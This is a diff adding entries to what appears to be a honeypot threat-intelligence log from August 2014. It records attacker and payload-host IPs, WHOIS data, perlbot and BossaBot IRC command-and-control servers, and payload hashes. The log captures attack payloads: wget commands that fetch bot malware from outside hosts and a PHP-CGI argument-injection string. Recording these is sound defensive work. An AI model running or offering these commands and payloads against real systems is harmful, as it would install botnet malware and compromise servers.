@@ -310,5 +310,188 @@ Payload: wget http://www.kniha.sivok.sk/letsex.php
 Description: N/A
 Notes: Payload seems to be based around clickfraud.
 
+#8/22/14:
 
+Pitcher: 58.56.136.154
+Catcher: 213.5.67.223
+NSlookup (pitcher): NX
+WHOIS (pitcher):
+58.56.0.0/15
+CHINANET-SD
+CN
+ipreport@sdtele.com
+anti-spam@ns.chinanet.cn.net
+NSlookup (catcher): hosted-by.as51430.net
+WHOIS (catcher):
+213.5.64.0/21
+AltusHost B.V.
+abuse@as51430.net
+AS51430
+Payload: wget http://213.5.67.223/jpg
+Description: perlbot
+Server: 50.56.238.185
+Port: 80
+Channel: #114
+NSlookup: 50-56-238-185.static.cloud-ips.com.
+WHOIS:
+50.56.236.0 - 50.56.239.255
+Rackspace Cloud Hosting
+Notes: 
+-Saw this same server hosting the same IRC Command and Control
+-85.25.73.217 is also pitching this same payload
+
+Pitcher: 91.209.192.252
+Catcher: 114.141.127.4
+NSlookup (pitcher): xenmaster34.drecomm.nl.
+WHOIS (pitcher):
+91.209.192.0/24
+Drecomm BV
+NL
+systeembeheer@drecomm.nl
+AS8312
+NSlookup (catcher): domain.not.configured
+WHOIS (catcher):
+114.141.112.0/20
+OBTRIX-NZ
+NZ
+abuse@obtrix.net
+ipadmin@obtrix.net
+Payload: wget http://114.141.127.4/done
+Description: perlbot
+Server: myircd.uk.to
+Port: 3303
+Channel: #x
+NSlookup: 213.133.99.68
+WHOIS:
+213.133.96.0/19
+Hetzner Online AG
+DE
+abuse@hetzner.de
+AS24940
+Notes: 
+- Saw  the same pitcher last week. different payload this time.
+- domain.not.configured is a non-authoritative response I got for querying the Catcher's IP. Unique response. Doesn't resolve to an IP address
+
+Pitcher: 23.23.211.99
+Catcher: 32.multicsdb.com, 64.multicsdb.com
+NSlookup (pitcher): ec2-23-23-211-99.compute-1.amazonaws.com.
+WHOIS (pitcher):
+23.20.0.0/14
+Amazon EC2
+US
+aes-noc@amazon.com
+ec2-abuse@amazon.com
+AS16509
+NSlookup (catcher): 188.165.14.158
+WHOIS (catcher):
+188.165.0.0/16
+OVH SAS
+FR
+abuse@ovh.net
+AS16276
+Payload: 
+wget http://64.multicsdb.com -P - -O 8FcGFwAT
+wget http://32.multicsdb.com -P - -O gcRLUd8K
+Description: BossaBot 32 and BossaBot64
+Server: 212.117.180.91
+Port: 8067
+Channel: #bitchly_ #sloboz
+NSlookup: irc.dreamboxdb.com
+WHOIS: 
+212.117.160.0/19
+root esolutions
+LU
+abuse@as5577.net
+AS5577
+Notes:
+-This Was a relatively fun one. Expect a blog post soon!
+-Both 32 and 64.multicsdb.com resolve to the same domain
+-Seems to be a BossaBot variant. Going to totally different IPs and domains.
+-Payloads: bb5c5a893dda5314cb60f7214f339183b285f59c  8FcGFwAT 0779f7734d06c1657f20e966c6633867f81fee8c  gcRLUd8K
+- 201.22.56.71 (Global Village Telecom, BR), 200.80.241.92 (magdelena virtual, AR), 46.29.252.216 (Webexxpurts, US), 46.22.128.196 (Blacknight, IE), 212.235.186.228 (academic and research network of slovenia, SI), 212.233.125.54 (AMT Group Telecom, RU), 174.36.7.10 (softlayer, US), 200.45.249.216 (AGENCIA ADVENTISTA DE DESARRO Y RECURSOS ASISTENCIALES ADRA, AR), 142.176.177.82 (Stentor National Integrated Communications Network, CA), 105.237.69.241, 105.237.54.82 (MTN Business SA Pool Region 7204, ZA), 23.21.90.253, 23.23.222.215 (Amazon EC2, US), 46.137.90.221 (Amazon AWS, IE), 87.229.163.22 (Foratec Communication, RU) also throwing this.
+
+Pitcher: 159.8.9.130
+Catcher:
+NSlookup (pitcher):
+WHOIS (pitcher):
+159.8.9.128/29
+IBM - IBMCCMPL
+FR
+jph.silvent@fr.ibm.com
+NSlookup (catcher):
+WHOIS (catcher):
+Payload: /?-d%20allow_url_include%3don+-d%20auto_prepend_file%3d1vuln1%20-n
+Description: payload unknown.
+Server:
+Port:
+Channel: 
+NSlookup: 
+WHOIS: 
+Notes:
+- Fixated with the energy sector... all hits were pointed towards energy sector domains. 
+- No Catcher IPs or CnC payloads detected.
+
+Pitcher: 222.216.28.248
+Catcher: 208.85.177.238
+Nslookup (pitcher): NX
+WHOIS (pitcher):
+222.216.0.0/15
+CHINANET-GX
+CN
+anti-spam@ns.chinanet.cn.net
+NSlookup (catcher): 208-85-177-238.peakinter.net
+WHOIS (catcher):
+208.85.176.0/21
+PEAKINTERNET
+US
+noc@peakinter.net
+Payload: wget 208.85.177.238/speedtest/.a/hb/php02
+Description: Perlbot
+Server: 194.24.228.203
+Port: 443
+Channel: #allornothing
+NSlookup: 194-24-228-203.thya.net.
+WHOIS:
+194.24.228.0/23
+L'ile aux surfers s.a.r.l.
+FR
+abuse@ripe.net
+AS41044
+Notes:
+- New Pitcher, old payload.
+- Also requests a shell callback to 91.121.105.21:22 unencrypted. (OVH France)
+
+Pitcher: 192.3.183.172
+Catcher: 192.3.183.172
+NSlookup (pitcher): NX
+WHOIS (pitcher):
+192.3.0.0/16
+ColoCrossing
+abuse@colocrossing.com
+support@colocrossing.com
+AS36352
+NSlookup (catcher): NX
+WHOIS (catcher):
+192.3.0.0/16
+ColoCrossing
+abuse@colocrossing.com
+support@colocrossing.com
+AS36352
+Payload: wget http://192.3.183.172/file wget http://192.3.183.172/wut
+Description: perlbot
+Server: 173.208.146.46
+Port: 6667
+Channel: #Apache, #pbot
+NSlookup: NX
+WHOIS:
+173.208.128.0/17
+WholeSale Internet, Inc
+US
+admin@wholesaleinternet.net
+abuse@wholesaleinternet.net
+Notes:
+
+Returning Champions:
+107.167.11.226
+188.190.98.18
 
